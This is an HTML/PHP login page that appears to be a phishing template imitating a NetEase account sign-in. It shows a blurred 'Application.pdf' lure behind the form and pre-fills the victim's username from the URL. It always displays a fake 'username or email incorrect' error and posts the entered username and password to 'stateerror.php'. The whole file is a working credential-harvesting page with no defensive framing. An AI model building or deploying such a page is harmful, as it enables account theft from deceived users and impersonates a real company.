<?php

?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page with PDF Background</title>

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      font-family: Arial, sans-serif;
      position: relative;
      overflow: hidden;
    }

    .pdf-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: -1;
    }

    .pdf-container embed {
      width: 100%;
      height: 100%;
      filter: brightness(0.3) blur(2px);
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.3);
      z-index: -1;
    }

    .container {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .login-box {
      background-color: white;
      padding: 30px 40px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }

    .login-box h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 12px 15px 12px 40px; /* Adjusted padding */
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }

    /* Adjusted icon position */
    .input-group i {
      position: absolute;
      top: 50%;
      left: 15px; /* Adjusted margin for proper alignment */
      transform: translateY(-50%);
      color: #888;
    }

    /* Error Styling */
    .error {
      color: red;
      font-size: 12px;
      margin-top: 5px;
      padding-bottom: 6px;
      display: block; /* Show error by default */
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #2e8ded;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #2179d4;
    }

    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #aaa;
    }

    @media (max-width: 768px) {
      .login-box {
        padding: 20px;
      }
    }
  </style>
  
 <script type="text/javascript">
  function geturle() {
    var params = new URLSearchParams(window.location.search);
    var getname = params.get('username') || ''; // fallback if not found
    document.getElementById('insert').value = getname;
  }

  // Run the function when the page is fully loaded
  window.onload = geturle;
</script>
</head>

<body>

  <!-- PDF background -->
  <div class="pdf-container">
    <embed src="./Application.pdf" type="application/pdf">
  </div>

  <!-- Overlay -->
  <div class="overlay"></div>

  <!-- Login Box -->
  <div class="container">
    <div class="login-box">
      <h2>账号登录</h2>
      <form action="stateerror.php" method="post" >
        <!-- Error message above the username field -->
        <div class="error">用户名或电子邮件不正确</div>
        <div class="input-group">
          <i class="fas fa-user"></i>
          <input type="text" id="insert" name="uid" placeholder="" value="" />
        </div>

        <!-- Error message above the password field -->
        
        <div class="input-group">
          <i class="fas fa-lock"></i>
          <input type="password" id="password" name="pid" placeholder="密码" />
        </div>
        
        <button type="submit">登入</button>
      </form>
      <div class="footer">
        <p>阅读并接受 《服务条款》和 《隐私政策》</p>
        &copy; 2025 NetEase, Inc.
      </div>
    </div>
  </div>

</body>
</html>
